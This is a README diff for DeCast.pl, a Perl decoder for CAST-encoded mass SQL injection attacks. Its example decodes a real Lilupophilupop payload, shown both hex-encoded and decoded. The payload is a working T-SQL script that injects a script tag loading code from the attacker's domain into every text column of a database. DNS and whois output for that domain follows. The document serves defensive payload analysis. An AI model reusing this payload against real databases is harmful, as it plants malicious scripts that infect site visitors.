@@ -2,4 +2,155 @@ DeCast.pl
 ---------
 Decoder for CAST encoded SQL attacks.  Accepts the payload as either STDIN or a file argument, outputs decoded CAST (following multiple levels recursively) including whois and dig output.
 
-This is useful for quickly analyzing payloads of many of the mass SQL injection attacks, including Asprox, Lizamoon, and Lilupophilupop.  
+This is useful for quickly analyzing payloads of many of the mass SQL injection attacks, including Asprox, Lizamoon, and Lilupophilupop. 
+
+Example 
+-------
+Example payload from http://isc.sans.edu/diary.html?storyid=12127#comment 
+
+$ perl decast.pl
+-- No Input file specified, reading from STDIN
+:/VALIDPAGE VALIDPARAM=0&VALIDPARAM=122+declare+%40s+varchar%284000%29+set+%40s%3Dcast%280x73657420616e73695f7761726e696e6773206f6666204445434c415245204054205641524348415228323535292c404320564152434841522832353529204445434c415245205461626c655f437572736f7220435552534f5220464f522073656c65637420632e5441424c455f4e414d452c632e434f4c554d4e5f4e414d452066726f6d20494e464f524d4154494f4e5f534348454d412e636f6c756d6e7320632c20494e464f524d4154494f4e5f534348454d412e7461626c6573207420776865726520632e444154415f5459504520696e2028276e76617263686172272c2776617263686172272c276e74657874272c2774657874272920616e6420632e4348415241435445525f4d4158494d554d5f4c454e4754483e333020616e6420742e7461626c655f6e616d653d632e7461626c655f6e616d6520616e6420742e7461626c655f747970653d2742415345205441424c4527204f50454e205461626c655f437572736f72204645544348204e4558542046524f4d205461626c655f437572736f7220494e544f2040542c4043205748494c4528404046455443485f5354415455533d302920424547494e20455845432827555044415445205b272b40542b275d20534554205b272b40432b275d3d2727223e3c2f7469746c653e3c736372697074207372633d22687474703a2f2f6c696c75706f7068696c75706f702e636f6d2f736c2e706870223e3c2f7363726970743e3c212d2d27272b525452494d28434f4e5645525428564152434841522836303030292c5b272b40432b275d2929207768657265204c45465428525452494d28434f4e5645525428564152434841522836303030292c5b272b40432b275d29292c3137293c3e2727223e3c2f7469746c653e3c7363726970742727202729204645544348204e4558542046524f4d205461626c655f437572736f7220494e544f2040542c404320454e4420434c4f5345205461626c655f437572736f72204445414c4c4f43415445205461626c655f437572736f72+as+varchar%284000%29%29+exec%28%40s%29--
+
+-- Decodes to
+set ansi_warnings off DECLARE @T VARCHAR(255),@C VARCHAR(255) DECLARE Table_Cursor CURSOR FOR select c.TABLE_NAME,c.COLUMN_NAME from INFORMATION_SCHEMA.columns c, INFORMATION_SCHEMA.tables t where c.DATA_TYPE in ('nvarchar','varchar','ntext','text') and c.CHARACTER_MAXIMUM_LENGTH>30 and t.table_name=c.table_name and t.table_type='BASE TABLE' OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN EXEC('UPDATE ['+@T+'] SET ['+@C+']=''"></title><script src="http://lilupophilupop.com/sl.php"></script><!--''+RTRIM(CONVERT(VARCHAR(6000),['+@C+'])) where LEFT(RTRIM(CONVERT(VARCHAR(6000),['+@C+'])),17)<>''"></title><script'' ') FETCH NEXT FROM Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor+
+--
+
+-- Found embedded script tag for domain: lilupophilupop.com
+-- Dig output for lilupophilupop.com 
+ 
+; <<>> DiG 9.7.1-P2 <<>> lilupophilupop.com
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 20332
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;lilupophilupop.com.            IN      A
+
+;; Query time: 1 msec
+;; SERVER: 192.168.1.1#53(192.168.1.1)
+;; WHEN: Wed Jan  4 06:11:02 2012
+;; MSG SIZE  rcvd: 36
+
+ 
+--
+
+-- Whois output for lilupophilupop.com 
+ 
+Whois Server Version 2.0
+
+Domain names in the .com and .net domains can now be registered
+with many different competing registrars. Go to http://www.internic.net
+for detailed information.
+
+   Domain Name: LILUPOPHILUPOP.COM
+   Registrar: BIZCN.COM, INC.
+   Whois Server: whois.bizcn.com
+   Referral URL: http://www.bizcn.com
+   Name Server: NS1.HOPERJOPER.RU
+   Name Server: NS2.HOPERJOPER.RU
+   Status: clientDeleteProhibited
+   Status: clientHold
+   Status: clientTransferProhibited
+   Updated Date: 04-jan-2012
+   Creation Date: 27-nov-2011
+   Expiration Date: 27-nov-2012
+
+>>> Last update of whois database: Wed, 04 Jan 2012 17:36:36 UTC <<<
+
+NOTICE: The expiration date displayed in this record is the date the 
+registrar's sponsorship of the domain name registration in the registry is 
+currently set to expire. This date does not necessarily reflect the expiration 
+date of the domain name registrant's agreement with the sponsoring 
+registrar.  Users may consult the sponsoring registrar's Whois database to 
+view the registrar's reported date of expiration for this registration.
+
+TERMS OF USE: You are not authorized to access or query our Whois 
+database through the use of electronic processes that are high-volume and 
+automated except as reasonably necessary to register domain names or 
+modify existing registrations; the Data in VeriSign Global Registry 
+Services' ("VeriSign") Whois database is provided by VeriSign for 
+information purposes only, and to assist persons in obtaining information 
+about or related to a domain name registration record. VeriSign does not 
+guarantee its accuracy. By submitting a Whois query, you agree to abide 
+by the following terms of use: You agree that you may use this Data only 
+for lawful purposes and that under no circumstances will you use this Data 
+to: (1) allow, enable, or otherwise support the transmission of mass 
+unsolicited, commercial advertising or solicitations via e-mail, telephone, 
+or facsimile; or (2) enable high volume, automated, electronic processes 
+that apply to VeriSign (or its computer systems). The compilation, 
+repackaging, dissemination or other use of this Data is expressly 
+prohibited without the prior written consent of VeriSign. You agree not to 
+use electronic processes that are automated and high-volume to access or 
+query the Whois database except as reasonably necessary to register 
+domain names or modify existing registrations. VeriSign reserves the right 
+to restrict your access to the Whois database in its sole discretion to ensure 
+operational stability.  VeriSign may restrict or terminate your access to the 
+Whois database for failure to abide by these terms of use. VeriSign 
+reserves the right to modify these terms at any time. 
+
+The Registry database contains ONLY .COM, .NET, .EDU domains and
+Registrars.
+
+The data in this whois database is provided to you for information
+purposes only, that is, to assist you in obtaining information about or
+related to a domain name registration record. We make this information
+available "as is," and do not guarantee its accuracy. By submitting a
+whois query, you agree that you will use this data only for lawful
+purposes and that, under no circumstances will you use this data to: (1)
+enable high volume, automated, electronic processes that stress or load
+this whois database system providing you this information; or (2) allow,
+enable, or otherwise support the transmission of mass unsolicited,
+commercial advertising or solicitations via direct mail, electronic
+mail, or by telephone.  The compilation, repackaging, dissemination or
+other use of this data is expressly prohibited without prior written
+consent from us.  We reserve the right to modify these terms at any time.
+By submitting this query, you agree to abide by these terms.
+Registration Service Provided By: Bizcn.com
+Website: http://www.cnobin.com
+Whois Server: whois.bizcn.com
+
+Domain name: lilupophilupop.com
+
+Registrant Contact:
+   NA
+   Millroy Gefree admin@lolypopholypop.com
+   +14122817109 fax: +14122817109
+   12 Road 45-12
+   Pittsburgh PA 64431
+   us
+
+Administrative Contact:
+   Millroy Gefree admin@lolypopholypop.com
+   +14122817109 fax: +14122817109
+   12 Road 45-12
+   Pittsburgh PA 64431
+   us
+
+Technical Contact:
+   Millroy Gefree admin@lolypopholypop.com
+   +14122817109 fax: +14122817109
+   12 Road 45-12
+   Pittsburgh PA 64431
+   us
+
+Billing Contact:
+   Millroy Gefree admin@lolypopholypop.com
+   +14122817109 fax: +14122817109
+   12 Road 45-12
+   Pittsburgh PA 64431
+   us
+
+Registration Service Provider:
+name: DomainCompany
+
+DNS:
+ns1.hoperjoper.ru
+ns2.hoperjoper.ru
+
+Created: 2011-11-27
+Expires: 2012-11-27
+
+-- 
+ 
